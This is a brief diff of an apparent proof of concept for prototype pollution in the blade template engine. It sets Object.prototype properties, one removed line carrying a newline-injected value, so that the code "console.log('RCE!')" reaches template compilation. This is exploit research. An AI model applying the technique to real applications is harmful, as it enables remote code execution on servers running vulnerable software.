@@ -4,11 +4,9 @@ const blade = require('blade');
  * prototype pollution
  */
 
-// still working on this
-Object.prototype.filename = "xxx\nconsole.log('RCE!')\n"
-Object.prototype.text = "x"
-Object.prototype.name = "x"
-Object.prototype.x = "text"
+
+Object.prototype.code = "console.log('RCE!')"
+Object.prototype.value = "somevalue" // helper property, bladejs/lib/parser/index.js::1316
 
 const template = `html
     head
